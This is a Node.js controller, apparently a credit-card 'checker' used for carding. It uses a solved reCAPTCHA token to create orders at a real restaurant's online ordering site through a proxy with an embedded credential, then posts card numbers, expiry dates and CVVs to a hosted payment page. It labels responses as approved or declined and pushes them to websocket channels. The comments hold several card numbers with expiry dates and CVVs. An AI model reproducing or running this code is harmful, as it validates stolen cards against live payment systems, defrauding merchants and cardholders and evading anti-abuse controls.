'use strict'
const Ws = use('Ws')
const { Curl } = require('node-libcurl');
const Database = use('Database')
const Restart = require('../../class/Restart.class');
const User = use('App/Models/User')

class VadateCardController {

    async GetId(user_id) {



        let time;
        time = setInterval(async () => {
            console.log('VERIFICANDO TOKEN_RECAPTCHA....')

            let result = await Database
                .table('url_tokens')
                .where('user_id', user_id)
                .first()
            if (result) {

                let token = await result.token_recaptcha
                let error = await result.erro_token

                if (token != null && error == null) {

                    const curl = new Curl();
                    curl.setOpt('URL', 'https://amarithcafe.revelup.com/weborders/create_order_and_pay_v1/');
                    curl.setOpt('PROXY', 'http://f1ca55670d414417ad52b796e2242a4d:@proxy.crawlera.com:8010');
                    curl.setOpt('HEADER', 1);
                    curl.setOpt('FOLLOWLOCATION', 1);
                    curl.setOpt(Curl.option.POST, 1);
                    curl.setOpt('SSL_VERIFYPEER', 0);
                    curl.setOpt('SSL_VERIFYHOST', 0);
                    curl.setOpt(Curl.option.IGNORE_CONTENT_LENGTH, 136);
                    curl.setOpt(Curl.option.HTTPHEADER, [
                        'Host: amarithcafe.revelup.com',
                        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0',
                        'Accept: application/json',
                        'Referer: https://amarithcafe.revelup.com/weborder/?establishment=1',
                        'Content-Type: application/x-www-form-urlencoded',
                        'Connection: keep-alive']
                    );


                    curl.setOpt(Curl.option.POSTFIELDS, '{"skin":"weborder","establishmentId":1,"items":[{"modifieritems":[],"price":1.5,"product":209,"product_name_override":"z","quantity":1,"product_sub_id":"c1160"}],"orderInfo":{"created_date":"2020-01-27T16:47:31","pickup_time":"2020-02-10T22:45:00","dining_option":0,"customer":{"phone":"1","email":"b@o.com","first_name":"B","last_name":"L"},"call_name":""},"paymentInfo":{"tip":0,"type":2},"recaptcha_v2_token":"' + token + '"}');

                    await curl.on('end', async (statusCode, data) => {

                        if (data.indexOf("\"status\": \"ERROR\"") != -1) {
                            return 'error'
                        } else {
                            // console.log(data)
                            let inicio = data.indexOf("\"TransactionSetupID\": \"");

                            let id_url = await data.substr(inicio + 23, 36)

                            const user = await User.find(user_id)
                            const userI = await user
                                .url_token()
                                .update({ link_url: id_url, token_recaptcha: null })

                            console.log('processo 1 terminado ')
                            await this.GetViews(id_url, user_id)
                        }
                    });
                    curl.on('error', curl.close.bind(curl))
                    curl.perform()
                    clearInterval(time)

                }
                if (error) {
                    const user = await User.find(user_id)
                    const userI = await user
                        .url_token()
                        .update({ link_url: null, token_recaptcha: null, erro_token: null, is_restart: 1 })

                    clearInterval(time)
                    console.log('erro na verificação do tokens')
                }
            }

        }, 5000);
        return
    }

    async GetViews(idd, user_id) {
        const aprovadas = await Ws.getChannel('status:*').topic('status:a' + user_id)
        const reprovadas = await Ws.getChannel('status:*').topic('status:r' + user_id)
        const testadas = await Ws.getChannel('status:*').topic('status:t' + user_id)
        //6509079001410445|12|2024|778
        //6504867262783814|06|2023|000
        //6504867262787880|06|2023|000
        for (let index = 0; index < 4; index++) {

            const curl1 = new Curl();
            curl1.setOpt('URL', 'https://transaction.hostedpayments.com/?TransactionSetupID=' + idd + '');
            curl1.setOpt('USERAGENT', "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
            curl1.setOpt('FOLLOWLOCATION', 1);
            curl1.setOpt('SSL_VERIFYPEER', 0);
            curl1.setOpt('SSL_VERIFYHOST', 0);
            curl1.setOpt(Curl.option.HTTPHEADER, [
                'Host: transaction.hostedpayments.com',
                'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Connection: keep-alive',
                'Upgrade-Insecure-Requests: 1',
            ]);

            await curl1.on('end', async (statusCode, data) => {

                let GETVIEWSTATE = data.indexOf('name="__VIEWSTATE" id="__VIEWSTATE" value="'); //47
                let GETVIEWSTATEGENERATOR = data.indexOf('name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="'); //64
                let GETEVENTVALIDATION = data.indexOf('name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="');//59

                let FinalVIEWSTATE = await data.indexOf('"', GETVIEWSTATE + 44);
                let FinalVIEWSTATEGENERATOR = await data.indexOf('"', GETVIEWSTATEGENERATOR + 62);
                let FinalEVENTVALIDATION = await data.indexOf('"', GETEVENTVALIDATION + 56);

                let STATE = await encodeURIComponent(data.substr(GETVIEWSTATE + 43, FinalVIEWSTATE - (GETVIEWSTATE + 43)))
                let STATEGENERATOR = await encodeURIComponent(data.substr(GETVIEWSTATEGENERATOR + 61, FinalVIEWSTATEGENERATOR - (GETVIEWSTATEGENERATOR + 61)))
                let EVENTVALIDATION = await encodeURIComponent(data.substr(GETEVENTVALIDATION + 55, FinalEVENTVALIDATION - (GETEVENTVALIDATION + 55)))
                //  parte que testa os cartões
                
                const curl2 = new Curl();
                let cc = "6504867262787880"
                let mes = "06"
                let ano = "23"
                let cvv_random = "000"


                let PostString = await 'scriptManager=upFormHP%7CprocessTransactionButton&__EVENTTARGET=processTransactionButton&__EVENTARGUMENT=&__VIEWSTATE=' + STATE + '&__VIEWSTATEGENERATOR=' + STATEGENERATOR + '&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=' + EVENTVALIDATION + '&hdnCancelled=&cardNumber=' + cc + '&ddlExpirationMonth=' + mes + '&ddlExpirationYear=' + ano + '&CVV=' + cvv_random + '&hdnSwipe=&hdnTruncatedCardNumber=&hdnValidatingSwipeForUseDefault=&__ASYNCPOST=true&'

                curl2.setOpt('URL', 'https://transaction.hostedpayments.com/?TransactionSetupID=' + idd + '');

                curl2.setOpt('HEADER', 1);
                curl2.setOpt(Curl.option.POST, 1);
                curl2.setOpt('USERAGENT', "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0");
                curl2.setOpt('FOLLOWLOCATION', 1);
                curl2.setOpt('SSL_VERIFYPEER', 0);
                curl2.setOpt('SSL_VERIFYHOST', 0);
                curl2.setOpt('CONNECTTIMEOUT', 2);
                curl2.setOpt('FAILONERROR', 1);
                curl2.setOpt(Curl.option.HTTPHEADER, [
                    'Host: transaction.hostedpayments.com',
                    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
                    'Accept: */*',
                    'X-Requested-With: XMLHttpRequest',
                    'X-MicrosoftAjax: Delta=true',
                    'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
                    'Connection: keep-alive',
                    'Referer: https://transaction.hostedpayments.com/?TransactionSetupID=' + idd + '',
                ]);

                curl2.setOpt(Curl.option.POSTFIELDS, PostString)

                await curl2.on('end', async (statusCode, data) => {
                    try {

                        if (testadas) {
                            await testadas.broadcastToAll('message', 1)
                        }
                        let GETR = await data.indexOf('<b>Error</b>:');
                        let ENDR = await data.indexOf('</span>', GETR + 12);
                        let Resultado = await data.substr(GETR + 13, ENDR - (GETR + 13))
                        if (Resultado) {
                            if (Resultado.trim() == 'Call Issuer') {
                                if (aprovadas) {
                                    await aprovadas.broadcastToAll('message', { cont: 1, msg: '<b class="badge badge-primary">#Aprovada</b> <b class="badge badge-light">' + 6504867262787880 + '</b> <b class="badge badge-info">Retorno: Válido</b> <b class="badge badge-success">#el-patron</b><br>' })
                                }
                                console.log(Resultado)
                                console.log('APROVADO')

                            } else {
                                if (reprovadas) {
                                    await reprovadas.broadcastToAll('message', { cont: 1, msg: ' <b class="badge badge-danger">#Reprovada</b> <b class="badge badge-light">' + 6504867262787880 + '</b> <b class="badge badge-danger">Retorno: Inválido</b><br>' })
                                }
                                console.log(Resultado)
                                console.log('REPROVADO')
                            }
                        } else {
                            //Declined
                            console.log(Resultado)
                            console.log('LINK EXPIRADO...')
                        }

                    } catch (error) {
                        console.log('expirado')
                    }
                });
                curl2.on('error', curl2.close.bind(curl2))
                curl2.perform()

            }, 5000);


            curl1.on('error', curl1.close.bind(curl1))
            curl1.perform()
            console.log('processo 2 terminado')

        }
        // for terminado
        // excluir link_url e token_recaptcha do banco de dados

        const user = await User.find(user_id)
        const userI = await user
            .url_token()
            .update({ link_url: null, token_recaptcha: null, erro_token: null, is_restart: 1 })
        return


    }

}

module.exports = VadateCardController
